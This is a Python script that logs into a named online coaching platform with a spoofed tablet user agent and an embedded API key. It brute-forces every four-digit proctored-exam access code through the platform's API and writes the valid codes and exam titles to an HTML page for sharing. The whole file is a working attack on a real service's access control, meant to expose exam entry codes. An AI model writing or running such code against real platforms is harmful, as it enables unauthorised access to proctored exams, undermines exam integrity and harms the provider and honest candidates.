import sys
import requests as r
import threading
from bs4 import BeautifulSoup as bs
import copy
import time
import os

BASE_URL = "https://classes.brilliantpala.org/"

HEADERS = {
        "User-Agent": f"Mozilla/5.0 (Linux; Android 11; Tab 11 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Safari/537.36",
        "Referer": BASE_URL,
        "X-Key": "d77fe6ed65feef09aeb8cd2d7d8a8044e9f1a79ed102f41e487f49e3713b43d2",
}

os.mkdir("build")
os.chdir("./build")
results = []
count = 0

def login(username, password):

    res = r.get(BASE_URL)
    bs_content = bs(res.content, "html.parser")
    csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]

    data = {"csrfmiddlewaretoken": csrf, "username": str(username), "password": str(password)}

    res = r.post(
        BASE_URL + "login/?next=",
        data=data,
        headers={"Referer": BASE_URL, "Cookie": "csrftoken=" + csrf},
        allow_redirects=False,
    )
    if res.status_code == 302:
        HEADERS["Cookie"] = (
            "sessionid="
            + res.cookies["sessionid"]
            + "; csrftoken="
            + res.cookies["csrftoken"]
        )

        res = r.get(
            BASE_URL + "logout_devices/?next=/",
            headers=HEADERS,
        )

        bs_content = bs(res.content, "html.parser")
        csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]

        r.post(
            BASE_URL + "logout_devices/?next=/",
            data={'csrfmiddlewaretoken': csrf},
            headers=HEADERS,
        )
        print("Logged in.")
        i = 1000
        p =[]
        while i < 10000:
            k = copy.deepcopy(i)
            h = threading.Thread(target=code, args=(k,), daemon=True)
            p.append(h)
            if len(p) >= 10:
                time.sleep(2)
                p =[]
            h.start()
            i += 1
        f = open("index.html","w+")
        f.write("""
<html>
<head><title>Brilliant Proctored Access Codes</title>
<style>
table, th, td{
  border:1px solid black;
  text-align: center;
  border-collapse: collapse;
  margin-left: auto;
  margin-right: auto;
}
</style>
</head>
<body align="center">
<h1>Brilliant Proctored Exam Access Codes</h1>
These are all valid access codes to exams which may or may not have started or ended on classes.brilliantpala.org
<hr>
<table>
<tr>
<th>Code</th><th>Exam</th>
</tr>
{}
</table>
<hr>
<footer>
Made by <a href="https://github.com/Alpha62579/">Robin.</a> on Samsung SM-T220, Brilliant's "locked" study tablet.
</footer>
</body>
</html>""".format('\n'.join([f"<tr><td>{code}</td><td>{title}</td></tr>" for code,title in results])))
        f.close()
        print("Process complete with", count, "codes found.")

def code(k):
    global count
    try:
        res = r.get(
            BASE_URL + f"api/v2.3/access_codes/{k}/exams/",
            headers=HEADERS,
        )
        if res.status_code == 200:
            results.append((k,res.json()['results'][0]['title']))
            count += 1
            print(k, "yay code")
    except Exception:
        pass

login(sys.argv[1],sys.argv[2])
